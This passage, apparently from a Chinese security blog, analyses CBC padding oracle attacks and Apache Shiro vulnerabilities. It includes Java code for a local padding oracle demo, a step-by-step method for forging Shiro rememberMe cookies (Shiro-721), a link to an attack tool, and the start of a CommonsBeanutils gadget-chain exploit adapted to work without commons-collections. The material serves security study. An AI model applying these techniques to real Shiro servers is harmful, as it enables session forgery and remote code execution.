</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">attackDecrypt</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">ciphertext</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">key</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">iv</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">tmp</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">8</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">attackiv</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">8</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 将byte数组0-7全部设为0x00
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">7</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">attackiv</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 遍历数组，并为数组赋值，代表八个元素
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">8</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 求attackiv的真实值，例如求最后一位的值：tmp[7] ^ 0x02
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">9</span> <span class="o">-</span> <span class="n">i</span><span class="o">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">8</span><span class="o">;</span> <span class="n">x</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">attackiv</span><span class="o">[</span><span class="n">x</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)(</span><span class="n">tmp</span><span class="o">[</span><span class="n">x</span><span class="o">]</span> <span class="o">^</span> <span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// 遍历0x00~0xff
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">256</span><span class="o">;</span> <span class="n">j</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 从尾部到头遍历八个字符，8-1,8-2~8-8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">attackiv</span><span class="o">[</span><span class="n">8</span> <span class="o">-</span> <span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="n">j</span><span class="o">;</span> <span class="c1">// 为当前字符赋值
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">decrypt</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">attackiv</span><span class="o">);</span> <span class="c1">// 解密，带入恶意attackiv
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// 如果flag为1，说明解密成功，也就确定了tmp的值，attackiv[8 - i] ^ i
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span><span class="o">(</span><span class="n">flag</span> <span class="o">==</span> <span class="n">1</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">tmp</span><span class="o">[</span><span class="n">8</span> <span class="o">-</span> <span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="o">(</span><span class="n">j</span> <span class="o">^</span> <span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">plaintext</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">8</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">8</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">plaintext</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="o">(</span><span class="n">iv</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">^</span> <span class="n">tmp</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//System.out.println(&#34;attackiv: &#34; + bytesToHex(attackiv));
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;iv: &#34;</span> <span class="o">+</span> <span class="n">bytesToHex</span><span class="o">(</span><span class="n">iv</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;palintext: &#34;</span> <span class="o">+</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">plaintext</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">tmp</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">byteToHex</span><span class="o">(</span><span class="kt">byte</span> <span class="n">b</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">hexString</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">toHexString</span><span class="o">(</span><span class="n">b</span> <span class="o">&amp;</span> <span class="n">0xFF</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//由于十六进制是由0~9、A~F来表示1~16，所以如果Byte转换成Hex后如果是&lt;16,就会是一个字符（比如A=10），通常是使用两个字符来表示16进制位的,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//假如一个字符的话，遇到字符串11，这到底是1个字节，还是1和1两个字节，容易混淆，如果是补0，那么1和1补充后就是0101，11就表示纯粹的11
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="n">hexString</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="n">2</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">hexString</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">0</span><span class="o">)).</span><span class="na">append</span><span class="o">(</span><span class="n">hexString</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">hexString</span><span class="o">.</span><span class="na">toUpperCase</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">bytesToHex</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;[ &#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">bytes</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="n">0</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">hex</span> <span class="o">=</span> <span class="n">byteToHex</span><span class="o">(</span><span class="n">bytes</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span></span><span class="line"><span class="cl">                <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;0x&#34;</span> <span class="o">+</span> <span class="n">hex</span> <span class="o">+</span> <span class="s">&#34; &#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34; ]&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">hexStringToBytes</span><span class="o">(</span><span class="n">String</span> <span class="n">hexString</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">hexString</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">hexString</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;&#34;</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">hexString</span> <span class="o">=</span> <span class="n">hexString</span><span class="o">.</span><span class="na">toUpperCase</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">hexString</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">/</span> <span class="n">2</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span><span class="o">[]</span> <span class="n">hexChars</span> <span class="o">=</span> <span class="n">hexString</span><span class="o">.</span><span class="na">toCharArray</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">d</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">length</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="n">2</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">d</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="o">(</span><span class="n">charToByte</span><span class="o">(</span><span class="n">hexChars</span><span class="o">[</span><span class="n">pos</span><span class="o">])</span> <span class="o">&lt;&lt;</span> <span class="n">4</span> <span class="o">|</span> <span class="n">charToByte</span><span class="o">(</span><span class="n">hexChars</span><span class="o">[</span><span class="n">pos</span> <span class="o">+</span> <span class="n">1</span><span class="o">]));</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">d</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span> <span class="nf">charToByte</span><span class="o">(</span><span class="kt">char</span> <span class="n">c</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="s">&#34;0123456789ABCDEF&#34;</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">c</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="o">(</span><span class="s">&#34;test&#34;</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="s">&#34;87654321&#34;</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="s">&#34;12345678&#34;</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">attackDecrypt</span><span class="o">(</span><span class="n">ciphertext</span><span class="o">,</span> <span class="s">&#34;87654321&#34;</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="s">&#34;12345678&#34;</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;tmp: &#34;</span> <span class="o">+</span> <span class="n">bytesToHex</span><span class="o">(</span><span class="n">tmp</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//        byte [] key = &#34;87654321&#34;.getBytes();
</span></span></span><span class="line"><span class="cl"><span class="c1">//        byte [] iv = &#34;12345678&#34;.getBytes();
</span></span></span><span class="line"><span class="cl"><span class="c1">//        byte[] ciphertext = encrypt(plaintext,key ,iv);
</span></span></span><span class="line"><span class="cl"><span class="c1">//`
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(&#34;ciphertext: &#34;+bytesToHex(ciphertext));
</span></span></span><span class="line"><span class="cl"><span class="c1">//        for (int i = 0; i &lt; 8; i++) {
</span></span></span><span class="line"><span class="cl"><span class="c1">//            iv[i] = (byte) 0x00;
</span></span></span><span class="line"><span class="cl"><span class="c1">//        }
</span></span></span><span class="line"><span class="cl"><span class="c1">//        iv[7] = (byte) 0x3D;
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(&#34;iv: &#34;+bytesToHex(iv));
</span></span></span><span class="line"><span class="cl"><span class="c1">//        byte[] decrypt = decrypt(ciphertext, key, iv);
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(flag);
</span></span></span><span class="line"><span class="cl"><span class="c1">//        //System.out.println(byteToHex(decrypt[5]));
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(new String(decrypt));
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//        byte[] bytes = &#34;testaaa&#34;.getBytes();
</span></span></span><span class="line"><span class="cl"><span class="c1">//        byte[] newBytes = new byte[8];
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.arraycopy(bytes, 0, newBytes, 0, bytes.length);
</span></span></span><span class="line"><span class="cl"><span class="c1">//        newBytes[7] = (byte) 0x01;
</span></span></span><span class="line"><span class="cl"><span class="c1">//        //System.out.println(Arrays.toString(newBytes));
</span></span></span><span class="line"><span class="cl"><span class="c1">//        byte[] ivs = new byte[8];
</span></span></span><span class="line"><span class="cl"><span class="c1">//        for (int i = 0; i &lt; newBytes.length; i++) {
</span></span></span><span class="line"><span class="cl"><span class="c1">//            ivs[i] = (byte)(newBytes[i] ^ tmp[i]);
</span></span></span><span class="line"><span class="cl"><span class="c1">//        }
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(&#34;attackiv: &#34; +bytesToHex(ivs));
</span></span></span><span class="line"><span class="cl"><span class="c1">//        byte[] decrypt = decrypt(ciphertext, key, ivs);
</span></span></span><span class="line"><span class="cl"><span class="c1">//        System.out.println(&#34;修改后的明文: &#34;+new String(decrypt));
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><h4 id="多组加密">多组加密</h4>
<p>从一组加密我们分析了两个漏洞的原理和利用方式，那么CBC通常是以多组加密的方式进行的，多组加密的流程如下：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/5c57fb93dd9d4da202866b1af2104975.png" alt="image-20220709182948691"></p>
<blockquote>
<p>图片转载于参考链接中的作者-耶鲁信</p>
</blockquote>
<p>可以看到多组加密就是：</p>
<p>1、第一组加密是使用初始化向量iv进行XOR，然后通过加密拿到密文1</p>
<p>2、第二组加密的在XOR使用的iv是上一组的密文1</p>
<p>3、以此类推直到分组结束</p>
<p>那么解密的过程呢？跟一组加解密还不一样：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/5b809608ee931879c8d61a718c9b39ef.png" alt="image-20220709185258788"></p>
<p>可以看到的是：</p>
<p>1、解密从解密的第一组密文开始，使用iv也是第一组的初始化向量</p>
<p>2、那么解密第二组的密文的时候，先通过解密运算后使用的iv是第一组的密文</p>
<p>3、以此类推解密出最终的多组明文，然后组合起来就是真正的明文字符</p>
<p>比如密文为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">iv[0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38]+密文1[0x83 0x77 0xA8 0x3F 0x6F 0x8E 0x00 0xBB ]+密文2[0x83 0x77 0xA8 0x3F 0x6F 0x8E 0x00 0xBB ]+密文3[...]
</span></span></code></pre></div><p>假如我们要解密可以从第二组开始，我们直接拿密文1去从充当iv就行了，<strong>注意了前一个密文解密失败不会影响后面密文的解密，会继续拿前一个密文当做iv。</strong></p>
<h3 id="shiro-padding-oracle-attack">Shiro Padding Oracle Attack</h3>
<p>Shiro在官方编号为721，这个是在550修复后比较出名的一个漏洞，但并不是反序列化，因为shiro无论是在最新版本还是存在这个反序列化的过程，前提条件是能拿到正确的key。但在shiro 1.4.2之前的版本可以利用Shiro Padding Oracle Attack进行攻击，因为在1.4.2之前的版本是利用CBC的加密模式进行的，就有可能存在该漏洞，而且并不需要key。</p>
<p>在更新1.2.4之后，官方就修复了固定key的漏洞，修改为每次启动shiro都会随机生成一次key：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231214164551609.png" alt="image-20231214164551609"></p>
<p>这里看了好多好多文章，终于理解是怎么运行的了。一头雾水，还以为要把这些中间值都解密出来，晕～</p>
<p>一开始我就迷惑，很多文章一直在讲看p0大神的文章，我去看的时候发现博客已经关闭了，思考了许久，还是想不出个道道来。因为你想后面加两组密文，分别为密文1和密文2，那么密文1是当作密文2的iv，根据不断改变iv的填充值获取后一个密文的中间值。然后通过我们的明文和中间值进行xor就可以得到我们密文1的真正的iv值。</p>
<p>我就迷惑了，就算密文1是当作iv去解密我们的随机密文4，那么AES对我们的密文4进行解密不是不能解密出来吗？</p>
<p>后面我真正找到p0的文章的时候，突然恍然大悟，原来我们不需要关心密文4进行解密的时候正不正确，只是说经过AES解密后然后和iv进行xor会变成一个乱码的明文而已。</p>
<p>所以用两组进行不断异或是下面的一个流程（这里用DES的8字节来表示）：</p>
<p>1、生成两个组，一个是00000000（密文2），一个是随机的12345678（密文3）</p>
<p>2、把两个组接起来，那么就是00000000（密文2）+12345678（密文3）</p>
<p>3、把两个组放到rememberMeCookie密文的后面，那么就是rememberMeCookie+00000000（密文2）+12345678（密文3）</p>
<p>4、发送新的rememberMeCookie到服务器，服务器会判断00000000（密文2）作为iv值去xor（密文3） 12345678是否填充正确</p>
<p>5、通过不断的测试，会得到一个新iv值，比如说00000000变成了87654321，那么我们就把这个值跟我们的一组payload进行xor，得到的这个值就是跟12345678解密出来的中间值xor的iv值，也就是新的（密文2）。</p>
<p>6、然而拿到这个iv值就可以当作前面一组的密文，然后继续生成00000000（密文1）和iv值（密文3）组合，配合rememberMeCookie继续进行填充猜解。</p>
<p>7、最后得出来的iv值+（密文1）+（密文2）+（密文3），这样解密下来是不是就能得到我们换进去的明文了。</p>
<p><strong>总结一下疑惑：</strong></p>
<p>1、为什么存在这个漏洞？</p>
<p>我们从上面分析shiro 550加解密的时候知道是<code>getRememberedPrincipals</code>方法拿到cookie值后进行解密，然后反序列化。通过convertBytesToPrincipals方法进行解密，如果填充值不对就会出发异常进到<code>onRememberedPrincipalFailure</code>方法当中：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215224739578.png" alt="image-20231215224739578"></p>
<p>会走到CookieRememberMeManager类的forgetIdentity方法：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215225040533.png" alt="image-20231215225040533"></p>
<p>这里是触发了SimpleCookie类的<code>removeFrom</code>方法，会把DELETED_COOKIE_VALUE写到cookie到中：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215225405476.png" alt="image-20231215225405476"></p>
<p>所以这里就符合我们padding Oracle 的条件：</p>
<ol>
<li>padding失败，返回rememberMe=deleteMe</li>
<li>padding成功，返回正常的响应数据</li>
</ol>
<p>2、为什么我们把额外的payload不断填充到rememberMeCookie后不会影响正常的反序列化？</p>
<p>我做了一个测试，就是把序列化后的字节码然后新增了一些字节码在后面，最后进行反序列化的时候是不影响前面的反序列化的。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215230036247.png" alt="image-20231215230036247"></p>
<blockquote>
<p>java中的ObjectOutputStream是一个Stream，他会按格式以队列方式读下去，后面拼接无关内容，不会影响反序列化。</p>
</blockquote>
<p>攻击的话可以用下面的工具进行：</p>
<p><a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a></p>
<p>但是呢，这个洞有点鸡肋，实战中有一些问题：</p>
<p>1、时间问题，本地猜解大概都要1个小时，实战更不容说了，时间成本很高</p>
<p>2、安全设备问题，因为不断通过发送大量的数据包过去会引起设备的阻拦和被监测到</p>
<p>3、payload长短，不宜太长，太长会导致发送数据包时间过长</p>
<h2 id="0x03-无利用链的shiro反序列化利用">0x03 无利用链的Shiro反序列化利用</h2>
<p>有时候我们打攻防的时候经常遇到Shiro能爆出key值，但是没有利用链，这个是怎么回事？</p>
<p>我们做个实验，把上文中的cc组件去掉，然后再重新打包运行：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215232409947.png" alt="image-20231215232409947"></p>
<p>你会发现是可以正常运行的，那就是使用shiro就根本不需要用到cc组件：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215232615875.png" alt="image-20231215232615875"></p>
<p>是因为shiro只需呀用到CommonsBeanutils组件即可，那么我们想到我们的CB1利用链：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215232954910.png" alt="image-20231215232954910"></p>
<p>我们尝试生成利用链看看,发现我们当中的BeanComparator类会利用到ComparableComparator，但是呢ComparableComparator又是CC组件里面的：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231215234804399.png" alt="image-20231215234804399"></p>
<p>知道BeanComparator中的ComparableComparator的作用就是返回一个ComparableComparator对象，实际上对我们利用链没有影响，所以我们要找一个是实现<code>Comparator</code>类，有<code>Serializable</code>的来代替。那么我们只能从java内部类、Shiro自带的、CommonsBeanutils里面寻找：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"> <span class="kd">public</span> <span class="nf">BeanComparator</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">((</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">BeanComparator</span><span class="o">(</span><span class="n">String</span> <span class="n">property</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">(</span><span class="n">property</span><span class="o">,</span> <span class="n">ComparableComparator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">BeanComparator</span><span class="o">(</span><span class="n">String</span> <span class="n">property</span><span class="o">,</span> <span class="n">Comparator</span> <span class="n">comparator</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="n">property</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">comparator</span> <span class="o">=</span> <span class="n">comparator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>在String里面有一个内部类是刚好符合我们的要求的：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231216002214360.png" alt="image-20231216002214360"></p>
<p>实现了Serializable和Comparator接口，那么它的常量名为<code>CASE_INSENSITIVE_ORDER</code>，我们直接调用即可：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/image-20231216002332984.png" alt="image-20231216002332984"></p>
<p>修改后的代码为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.shiro.crypto.AesCipherService</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.shiro.util.ByteSource</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
